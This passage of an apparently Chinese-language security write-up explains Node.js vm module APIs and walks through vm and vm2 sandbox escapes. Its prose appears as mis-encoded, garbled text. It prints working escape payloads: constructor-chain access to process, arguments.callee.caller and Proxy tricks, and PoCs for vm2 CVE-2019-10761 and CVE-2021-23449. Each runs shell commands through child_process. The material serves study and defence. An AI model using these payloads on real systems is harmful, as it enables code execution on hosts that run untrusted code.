PerformanceNodeTiming {\n      name: 'node',\n      entryType: 'node',\n      startTime: 0,\n      duration: 25.98190000653267,\n      nodeStart: 0.4919999986886978,\n      v8Start: 2.0012000054121017,\n      bootstrapComplete: 18.864999994635582,\n      environment: 10.277099996805191,\n      loopStart: -1,\n      loopExit: -1,\n      idleTime: 0\n    },\n    timeOrigin: 1665558311872.296\n  },\n  clearImmediate: [Function: clearImmediate],\n  setImmediate: [Function: setImmediate] {\n    [Symbol(nodejs.util.promisify.custom)]: [Getter]\n  },\n  age: 20\n}\n```\n\n\n\n## **0x04 vmæ²™ç®±é€ƒé€¸**\n\næˆ‘ä»¬åœ¨å‰é¢æåˆ°äº†ä½œç”¨åŸŸè¿™ä¸ªæ¦‚å¿µï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨æ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæƒ³è¦å®ç°æ²™ç®±çš„éš”ç¦»ä½œç”¨ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œè®©ä»£ç åœ¨è¿™ä¸ªæ–°çš„ä½œç”¨åŸŸé‡Œé¢å»è¿è¡Œï¼Œè¿™æ ·å°±å’Œå…¶ä»–çš„ä½œç”¨åŸŸè¿›è¡Œäº†éš”ç¦»ï¼Œè¿™ä¹Ÿå°±æ˜¯vmæ¨¡å—è¿è¡Œçš„åŸç†ï¼Œå…ˆæ¥äº†è§£å‡ ä¸ªå¸¸ç”¨çš„vmæ¨¡å—çš„APIã€‚\n\n- `vm.runinThisContext(code)`ï¼šåœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚sandboxä¸­å¯ä»¥è®¿é—®åˆ°globalä¸­çš„å±æ€§ï¼Œä½†æ— æ³•è®¿é—®å…¶ä»–åŒ…ä¸­çš„å±æ€§ã€‚\n\n  ![](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121548200.png)\n\n```javascript\nconst vm = require('vm');\nlet localVar = 'initial value';\nconst vmResult = vm.runInThisContext('localVar = \"vm\";');\nconsole.log('vmResult:', vmResult);\nconsole.log('localVar:', localVar);\n// vmResult: 'vm', localVar: 'initial value'\n```\n\n- `vm.createContext([sandbox])`ï¼š åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚\n\n  `vm.runInContext(code, contextifiedSandbox[, options])`ï¼šå‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚\n\n  ![image-20221012154008522](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121540576.png)\n\n  ```javascript\n  const util = require('util');\n  const vm = require('vm');\n  global.globalVar = 3;\n  const sandbox = { globalVar: 1 };\n  vm.createContext(sandbox);\n  vm.runInContext('globalVar *= 2;', sandbox);\n  console.log(util.inspect(sandbox)); // { globalVar: 2 }\n  console.log(util.inspect(globalVar)); // 3\n  ```\n\n  - `vm.runInNewContext(code[, sandbox][, options])`: creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ã€‚\n  - `vm.Scriptç±»` vm.Scriptç±»å‹çš„å®ä¾‹åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±ï¼ˆæˆ–è€…ä¸Šä¸‹æ–‡ï¼‰ä¸­è¢«è¿è¡Œã€‚\n  - `new vm.Script(code, options)`ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼Œç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚\n    codeï¼šè¦è¢«è§£æçš„JavaScriptä»£ç \n\n  ```javascript\n  const util = require('util');\n  const vm = require('vm');\n  const sandbox = {\n   animal: 'cat',\n   count: 2\n  };\n  const script = new vm.Script('count += 1; name = \"kitty\";');\n  const context = vm.createContext(sandbox);\n  script.runInContext(context);\n  console.log(util.inspect(sandbox));\n  // { animal: 'cat', count: 3, name: 'kitty' }\n  ```\n\n  scriptå¯¹è±¡å¯ä»¥é€šè¿‡runInXXXContextè¿è¡Œã€‚\n\n\n\næˆ‘ä»¬ä¸€èˆ¬è¿›è¡Œæ²™ç®±é€ƒé€¸æœ€åéƒ½æ˜¯è¿›è¡Œrceï¼Œé‚£ä¹ˆåœ¨Nodeé‡Œè¦è¿›è¡Œrceå°±éœ€è¦proccesäº†ï¼Œåœ¨è·å–åˆ°processå¯¹è±¡åæˆ‘ä»¬å°±å¯ä»¥ç”¨requireæ¥å¯¼å…¥child_processï¼Œå†åˆ©ç”¨child_processæ‰§è¡Œå‘½ä»¤ã€‚ä½†processæŒ‚è½½åœ¨globalä¸Šï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´äº†åœ¨`creatContext`åæ˜¯ä¸èƒ½è®¿é—®åˆ°globalçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯é€šè¿‡å„ç§åŠæ³•å°†globalä¸Šçš„processå¼•å…¥åˆ°æ²™ç®±ä¸­ã€‚\n\nå¦‚æœæˆ‘ä»¬æŠŠä»£ç æ”¹æˆè¿™æ ·ï¼ˆcodeå‚æ•°æœ€å¥½ç”¨åå¼•å·åŒ…è£¹ï¼Œè¿™æ ·å¯ä»¥ä½¿codeæ›´ä¸¥æ ¼ä¾¿äºæ‰§è¡Œï¼‰ï¼š\n\n```javascript\n\"use strict\";\nconst vm = require(\"vm\");\nconst y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`);\nconsole.log(y1);\n```\n\n![image-20221012163040569](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121630628.png)\n\n```javascript\n vm.runInNewContext(`this.constructor.constructor('return process.env')()`);\n```\n\né‚£ä¹ˆæˆ‘ä»¬æ˜¯æ€ä¹ˆå®ç°é€ƒé€¸çš„å‘¢ï¼Œé¦–å…ˆè¿™é‡Œé¢çš„thisæŒ‡å‘çš„æ˜¯å½“å‰ä¼ é€’ç»™`runInNewContext`çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å±äºæ²™ç®±ç¯å¢ƒçš„ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–åˆ°å®ƒçš„æ„é€ å™¨ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ï¼ˆæ­¤æ—¶ä¸ºFunctionçš„constructorï¼‰ï¼Œæœ€åçš„`()`æ˜¯è°ƒç”¨è¿™ä¸ªç”¨Functionçš„constructorç”Ÿæˆçš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ªprocesså¯¹è±¡ã€‚\n\nä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœï¼š\n\n```javascript\nconst y1 = vm.runInNewContext(`this.toString.constructor('return process')()`);\n```\n\nç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿”å›çš„processå¯¹è±¡æ¥rceäº†\n\n```javascript\ny1.mainModule.require('child_process').execSync('whoami').toString()\n```\n\n\n\nè¿™é‡ŒçŸ¥è¯†æ˜Ÿçƒä¸Šæåˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸‹é¢è¿™æ®µä»£ç ï¼š\n\n```javascript\nconst vm = require('vm');\nconst script = `m + n`;\nconst sandbox = { m: 1, n: 2 };\nconst context = new vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log(res)\n```\n\næˆ‘ä»¬èƒ½ä¸èƒ½æŠŠ`this.toString.constructor('return process')()`ä¸­çš„thisæ¢æˆ{}å‘¢ï¼Ÿ {}çš„æ„æ€æ˜¯åœ¨æ²™ç®±å†…å£°æ˜äº†ä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå¯¹è±¡æ˜¯ä¸èƒ½è®¿é—®åˆ°globalä¸‹çš„ã€‚\n\nå¦‚æœæˆ‘ä»¬å°†thisæ¢æˆmå’Œnä¹Ÿæ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå› ä¸ºæ•°å­—ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”è¿™äº›éƒ½æ˜¯primitiveç±»å‹ï¼Œä»–ä»¬åœ¨ä¼ é€’çš„è¿‡ç¨‹ä¸­æ˜¯å°†å€¼ä¼ é€’è¿‡å»è€Œä¸æ˜¯å¼•ç”¨ï¼ˆç±»ä¼¼äºå‡½æ•°ä¼ é€’å½¢å‚ï¼‰ï¼Œåœ¨æ²™ç›’å†…ä½¿ç”¨çš„mnå·²ç»ä¸æ˜¯åŸæ¥çš„mnäº†ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨ã€‚\n\næˆ‘ä»¬å°†mnæ”¹æˆå…¶ä»–ç±»å‹å°±å¯ä»¥åˆ©ç”¨äº†ï¼š\n\n![image-20221012170835453](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210121708516.png)\n\n\n\n## **0x05 vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›å…¶ä»–æƒ…å†µ**\n\n\n\nçŸ¥è¯†æ˜Ÿçƒé‡Œæåˆ°äº†è¿™æ ·çš„æƒ…å†µï¼š\n\n```javascript\nconst vm = require('vm');\nconst script = `...`;\nconst sandbox = Object.create(null);\nconst context = vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log('Hello ' + res)\n```\n\n\n\næˆ‘ä»¬ç°åœ¨çš„thisä¸ºnullï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å…¶ä»–å¯ä»¥å¼•ç”¨çš„å¯¹è±¡ï¼Œè¿™æ—¶å€™æƒ³è¦é€ƒé€¸æˆ‘ä»¬è¦ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§`arguments.callee.caller`ï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚\n\næˆ‘ä»¬ä¸Šé¢æ¼”ç¤ºçš„æ²™ç®±é€ƒé€¸å…¶å®å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬åªè¦åœ¨æ²™ç®±å†…å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç„¶ååœ¨æ²™ç®±å¤–è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªå‡½æ•°çš„`arguments.callee.caller`å°±ä¼šè¿”å›æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…å°±å¯ä»¥è¿›è¡Œé€ƒé€¸äº†ã€‚\n\n![image-20221014171057337](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210141711421.png)\n\n\n\næˆ‘ä»¬åˆ†æä¸€ä¸‹è¿™æ®µä»£ç \n\n```javascript\nconst vm = require('vm');\nconst script = \n`(() => {\n    const a = {}\n    a.toString = function () {\n      const cc = arguments.callee.caller;\n      const p = (cc.constructor.constructor('return process'))();\n      return p.mainModule.require('child_process').execSync('whoami').toString()\n    }\n    return a\n  })()`;\n\nconst sandbox = Object.create(null);\nconst context = new vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log('Hello ' + res)\n```\n\næˆ‘ä»¬åœ¨æ²™ç®±å†…å…ˆåˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å°†è¿™ä¸ªå¯¹è±¡çš„toStringæ–¹æ³•è¿›è¡Œäº†é‡å†™ï¼Œé€šè¿‡`arguments.callee.caller`è·å¾—åˆ°æ²™ç®±å¤–çš„ä¸€ä¸ªå¯¹è±¡ï¼Œåˆ©ç”¨è¿™ä¸ªå¯¹è±¡çš„æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°è¿”å›äº†processï¼Œå†è°ƒç”¨processè¿›è¡Œrceï¼Œæ²™ç®±å¤–åœ¨console.logä¸­é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼è§¦å‘äº†è¿™ä¸ªé‡å†™åçš„toStringå‡½æ•°ã€‚\n\nå¦‚æœæ²™ç®±å¤–æ²¡æœ‰æ‰§è¡Œå­—ç¬¦ä¸²çš„ç›¸å…³æ“ä½œæ¥è§¦å‘è¿™ä¸ªtoStringï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰å¯ä»¥ç”¨æ¥è¿›è¡Œæ¶æ„é‡å†™çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨`Proxy`æ¥åŠ«æŒå±æ€§\n\n[Proxy å’Œ Reflect - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/6844904090116292616)\n\n![image-20221017194803074](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210171948191.png)\n\n```javascript\nconst vm = require(\"vm\");\n\nconst script = \n`\n(() =>{\n    const a = new Proxy({}, {\n        get: function(){\n            const cc = arguments.callee.caller;\n            const p = (cc.constructor.constructor('return process'))();\n            return p.mainModule.require('child_process').execSync('whoami').toString();\n        }\n    })\n    return a\n})()\n`;\nconst sandbox = Object.create(null);\nconst context = new vm.createContext(sandbox);\nconst res = vm.runInContext(script, context);\nconsole.log(res.abc)\n```\n\nè§¦å‘åˆ©ç”¨é“¾çš„é€»è¾‘å°±æ˜¯æˆ‘ä»¬åœ¨`get:`è¿™ä¸ªé’©å­é‡Œå†™äº†ä¸€ä¸ªæ¶æ„å‡½æ•°ï¼Œå½“æˆ‘ä»¬åœ¨æ²™ç®±å¤–è®¿é—®proxyå¯¹è±¡çš„ä»»æ„å±æ€§ï¼ˆä¸è®ºæ˜¯å¦å­˜åœ¨ï¼‰è¿™ä¸ªé’©å­å°±ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå®ç°äº†rceã€‚\n\nå¦‚æœæ²™ç®±çš„è¿”å›å€¼è¿”å›çš„æ˜¯æˆ‘ä»¬æ— æ³•åˆ©ç”¨çš„å¯¹è±¡æˆ–è€…æ²¡æœ‰è¿”å›å€¼åº”è¯¥æ€ä¹ˆè¿›è¡Œé€ƒé€¸å‘¢ï¼Ÿ\n\næˆ‘ä»¬å¯ä»¥å€ŸåŠ©å¼‚å¸¸ï¼Œå°†æ²™ç®±å†…çš„å¯¹è±¡æŠ›å‡ºå»ï¼Œç„¶ååœ¨å¤–éƒ¨è¾“å‡ºï¼š\n\n![image-20221017195034139](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210171950196.png)\n\n```javascript\nconst vm = require(\"vm\");\n\nconst script = \n`\n    throw new Proxy({}, {\n        get: function(){\n            const cc = arguments.callee.caller;\n            const p = (cc.constructor.constructor('return process'))();\n            return p.mainModule.require('child_process').execSync('whoami').toString();\n        }\n    })\n`;\ntry {\n    vm.runInContext(script, vm.createContext(Object.create(null)));\n}catch(e) {\n    console.log(\"error:\" + e) \n} \n```\n\nè¿™é‡Œæˆ‘ä»¬ç”¨catchæ•è·åˆ°äº†throwå‡ºçš„proxyå¯¹è±¡ï¼Œåœ¨console.logæ—¶ç”±äºå°†å­—ç¬¦ä¸²ä¸å¯¹è±¡æ‹¼æ¥ï¼Œå°†æŠ¥é”™ä¿¡æ¯å’Œrceçš„å›æ˜¾ä¸€èµ·å¸¦äº†å‡ºæ¥ã€‚\n\n\n\n## **0x06 vm2**\n\né€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­å¯ä»¥çœ‹å‡ºæ¥vmæ²™ç®±éš”ç¦»åŠŸèƒ½è¾ƒå¼±ï¼Œæœ‰å¾ˆå¤šé€ƒé€¸çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç¬¬ä¸‰æ–¹åŒ…vm2åœ¨vmçš„åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™äº›ä¼˜åŒ–å…·ä½“æ˜¯æ€ä¹ˆå®ç°çš„ã€‚\n\nå®‰è£…vm2åŒ…ï¼š\n\n```shell\nnpm install vm2\n```\n\næ•´ä¸ªvm2åŒ…ä¸‹æ˜¯è¿™æ ·çš„ç»“æ„ï¼š\n\n![image-20221018164821223](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210181648329.png)\n\n- `cli.js`å®ç°äº†å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è°ƒç”¨vm2 ä¹Ÿå°±æ˜¯binä¸‹çš„vm2ã€‚\n\n- `contextify.js`å°è£…äº†ä¸‰ä¸ªå¯¹è±¡ï¼š`Contextify Decontextify propertyDescriptor`ï¼Œå¹¶ä¸”é’ˆå¯¹globalçš„Bufferç±»è¿›è¡Œäº†ä»£ç†ã€‚\n- `main.js` æ˜¯vm2æ‰§è¡Œçš„å…¥å£ï¼Œå¯¼å‡ºäº†`NodeVM VM `è¿™ä¸¤ä¸ªæ²™ç®±ç¯å¢ƒï¼Œè¿˜æœ‰ä¸€ä¸ª`VMScript`å®é™…ä¸Šæ˜¯å°è£…äº†`vm.Script`ã€‚\n- `sandbox.js`é’ˆå¯¹globalçš„ä¸€äº›å‡½æ•°å’Œå˜é‡è¿›è¡Œäº†æ‹¦æˆªï¼Œæ¯”å¦‚`setTimeoutï¼ŒsetInterval`ç­‰\n\nvm2ç›¸æ¯”vmåšå‡ºå¾ˆå¤§çš„æ”¹è¿›ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯åˆ©ç”¨äº†es6æ–°å¢çš„proxyç‰¹æ€§ï¼Œä»è€Œä½¿ç”¨é’©å­æ‹¦æˆªå¯¹`constructorå’Œ__proto__`è¿™äº›å±æ€§çš„è®¿é—®ã€‚\n\nå…ˆç”¨vm2æ¼”ç¤ºä¸€ä¸‹ï¼š\n\n```javascript\nconst {VM, VMScript} = require('vm2');\n\nconst script = new VMScript(\"let a = 2;a;\");\n\nconsole.log((new VM()).run(script));\n```\n\n`VM`æ˜¯vm2åœ¨vmçš„åŸºç¡€ä¸Šå°è£…çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œæˆ‘ä»¬åªéœ€è¦å®ä¾‹åŒ–åè°ƒç”¨å…¶ä¸­çš„runæ–¹æ³•å°±å¯ä»¥è¿è¡Œä¸€æ®µè„šæœ¬ã€‚\n\n\n\né‚£ä¹ˆvm2åœ¨è¿è¡Œè¿™ä¸¤è¡Œä»£ç æ—¶éƒ½åšäº†ä»€ä¹ˆäº‹ï¼š\n\n![image-20221018170911509](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210181709570.png)\n\n\n\nå¯ä»¥å‘ç°ç›¸æ¯”äºvmçš„æ²™ç®±ç¯å¢ƒï¼Œvm2æœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯å¼•å…¥`sandbox.js`å¹¶é’ˆå¯¹contextåšå°è£…ã€‚\n\né‚£ä¹ˆvm2å…·ä½“æ˜¯æ€ä¹ˆå®ç°å¯¹contextçš„å°è£…ï¼Ÿ\n\nvm2å‡ºç°è¿‡å¤šæ¬¡é€ƒé€¸çš„é—®é¢˜ï¼Œæ‰€ä»¥ç°æœ‰çš„ä»£ç è¢«è¿›è¡Œäº†å¤§é‡ä¿®æ”¹ï¼Œä¸ºäº†æ–¹ä¾¿åˆ†æéœ€è¦ä½¿ç”¨è¾ƒè€ç‰ˆæœ¬çš„vm2ï¼Œä½†githubä¸Šè²Œä¼¼å°†3.9ä»¥å‰çš„ç‰ˆæœ¬å…¨éƒ½åˆ é™¤äº†ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¹Ÿæ‰¾ä¸åˆ°å¯¹åº”çš„èµ„æºäº†ï¼Œä»£ç åˆ†æä¹Ÿæ¯”è¾ƒéº»çƒ¦ï¼Œç›´æ¥ç§»æ­¥é“¾æ¥ï¼š\n\n[vm2å®ç°åŸç†åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/207283#h2-1)\n\n\n\n## **0x07 vm2ä¸­çš„æ²™ç®±ç»•è¿‡**\n\n### **CVE-2019-10761**\n\nè¯¥æ¼æ´è¦æ±‚vm2ç‰ˆæœ¬<=3.6.10\n\n```javascript\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = `\nconst f = Buffer.prototype.write;\nconst ft = {\n\t\tlength: 10,\n\t\tutf8Write(){\n\t\t\t\n\t\t}\n}\nfunction r(i){\n\tvar x = 0;\n\ttry{\n\t\tx = r(i);\n\t}catch(e){}\n\tif(typeof(x)!=='number')\n\t\treturn x;\n\tif(x!==i)\n\t\treturn x+1;\n\ttry{\n\t\tf.call(ft);\n\t}catch(e){\n\t\treturn e;\n\t}\n\treturn null;\n}\nvar i=1;\nwhile(1){\n\ttry{\n\t\ti=r(i).constructor.constructor(\"return process\")();\n\t\tbreak;\n\t}catch(x){\n\t\ti++;\n\t}\n}\ni.mainModule.require(\"child_process\").execSync(\"whoami\").toString()\n`;\ntry{\n\tconsole.log(new VM().run(untrusted));\n}catch(x){\n\tconsole.log(x);\n}\n```\n\nè¿™ä¸ªé“¾å­åœ¨pç‰›çš„çŸ¥è¯†æ˜Ÿçƒä¸Šæœ‰ï¼Œå¾ˆæŠ½è±¡ï¼Œæ²™ç®±é€ƒé€¸è¯´åˆ°åº•å°±æ˜¯è¦ä»æ²™ç®±å¤–è·å–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åè·å¾—è¿™ä¸ªå¯¹è±¡çš„constructorå±æ€§ï¼Œè¿™æ¡é“¾å­è·å–æ²™ç®±å¤–å¯¹è±¡çš„æ–¹æ³•æ˜¯ åœ¨æ²™ç®±å†…ä¸æ–­é€’å½’ä¸€ä¸ªå‡½æ•°ï¼Œå½“é€’å½’æ¬¡æ•°è¶…è¿‡å½“å‰ç¯å¢ƒçš„æœ€å¤§å€¼æ—¶ï¼Œæˆ‘ä»¬æ­£å¥½è°ƒç”¨æ²™ç®±å¤–çš„å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´æ²™ç®±å¤–çš„è°ƒç”¨æ ˆè¢«çˆ†æ‰ï¼Œæˆ‘ä»¬åœ¨æ²™ç®±å†…catchè¿™ä¸ªå¼‚å¸¸å¯¹è±¡ï¼Œå°±æ‹¿åˆ°äº†ä¸€ä¸ªæ²™ç®±å¤–çš„å¯¹è±¡ã€‚ä¸¾ä¸ªä¾‹å­ï¼š\n\nå‡è®¾å½“å‰ç¯å¢ƒä¸‹æœ€å¤§é€’å½’å€¼ä¸º1000ï¼Œæˆ‘ä»¬é€šè¿‡ç¨‹åºæ§åˆ¶é€’å½’999æ¬¡ï¼ˆæ³¨æ„è¿™é‡Œè¯´çš„é€’å½’å€¼ä¸æ˜¯ä¸€ç›´è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°çš„æœ€å¤§å€¼ï¼Œè€Œæ˜¯å•æ¬¡ç¨‹åºå†…è°ƒç”¨å‡½æ•°æ¬¡æ•°çš„æœ€å¤§å€¼ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨æ ˆçš„æœ€å¤§å€¼ï¼‰ï¼š\n\n```javascript\nr(i);      // è¯¥å‡½æ•°é€’å½’999æ¬¡\n\nf.call(ft);    // é€’å½’åˆ°ç¬¬1000æ¬¡æ—¶è°ƒç”¨fè¿™ä¸ªå‡½æ•°ï¼Œfä¸ºBuffer.prototype.writeï¼Œå°±æ˜¯ä¸‹é¢å›¾ç‰‡çš„è¿™ä¸ªå‡½æ•°\n\nthis.utf8Write()   // é€’å½’åˆ°1001æ¬¡æ—¶ä¸ºè¯¥å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å‡½æ•°ï¼Œæ‰€ä»¥çˆ†æ ˆæ—¶æ•æ‰çš„å¼‚å¸¸ä¹Ÿæ˜¯æ²™ç®±å¤–ï¼Œä»è€Œè¿”å›äº†ä¸€ä¸ªæ²™ç®±\t\t\t\t\tå¤–çš„å¼‚å¸¸å¯¹è±¡\n```\n\n![image-20221018203447018](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210182034077.png)\n\n\n\n### **CVE-2021-23449**\n\n è¿™ä¸ªæ¼æ´åœ¨snykè§£é‡Šæ˜¯åŸå‹é“¾æ±¡æŸ“å¯¼è‡´çš„æ²™ç®±é€ƒé€¸ï¼Œä½†pç‰›åœ¨çŸ¥è¯†æ˜Ÿçƒé‡Œå‘äº†å…¶å®æ˜¯å¦å¤–çš„åŸå› \n\n[Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk](https://security.snyk.io/vuln/SNYK-JS-VM2-1585918) \n\npocï¼š\n\n```javascript\nlet res = import('./foo.js')\nres.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n```\n\nimport()åœ¨JavaScriptä¸­æ˜¯ä¸€ä¸ªè¯­æ³•ç»“æ„ï¼Œä¸æ˜¯å‡½æ•°ï¼Œæ²¡æ³•é€šè¿‡ä¹‹å‰å¯¹requireè¿™ç§å‡½æ•°å¤„ç†ç›¸åŒçš„æ–¹æ³•æ¥å¤„ç†å®ƒï¼Œå¯¼è‡´å®é™…ä¸Šæˆ‘ä»¬è°ƒç”¨import()çš„ç»“æœå®é™…ä¸Šæ˜¯æ²¡æœ‰ç»è¿‡æ²™ç®±çš„ï¼Œæ˜¯ä¸€ä¸ªå¤–éƒ¨å˜é‡ã€‚ æˆ‘ä»¬å†è·å–è¿™ä¸ªå˜é‡çš„å±æ€§å³å¯ç»•è¿‡æ²™ç®±ã€‚ vm2å¯¹æ­¤çš„ä¿®å¤æ–¹æ³•ä¹Ÿå¾ˆç²—ç³™ï¼Œæ­£åˆ™åŒ¹é…å¹¶æ›¿æ¢äº†\\bimport\\bå…³é”®å­—ï¼Œåœ¨ç¼–è¯‘å¤±è´¥çš„æ—¶å€™ï¼ŒæŠ¥Dynamic Import not supportedé”™è¯¯ã€‚\n\n\n\n### **çŸ¥è¯†æ˜Ÿçƒä¸Šçš„å¦å¤–ä¸€ä¸ªtrick**\n\n\n\n```javascript\nSymbol = {\n  get toStringTag(){\n    throw f=>f.constructor(\"return process\")()\n  }\n};\ntry{\n  Buffer.from(new Map());\n}catch(f){\n  Symbol = {};\n  f(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n}\n```\n\nåœ¨vm2çš„åŸç†ä¸­æåˆ°vm2ä¼šä¸ºå¯¹è±¡é…ç½®ä»£ç†å¹¶åˆå§‹åŒ–ï¼Œå¦‚æœå¯¹è±¡æ˜¯ä»¥ä¸‹ç±»å‹ï¼š\n\n![image-20221023152804997](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210231528122.png)\n\nå°±ä¼šreturn `Decontextify.instance` 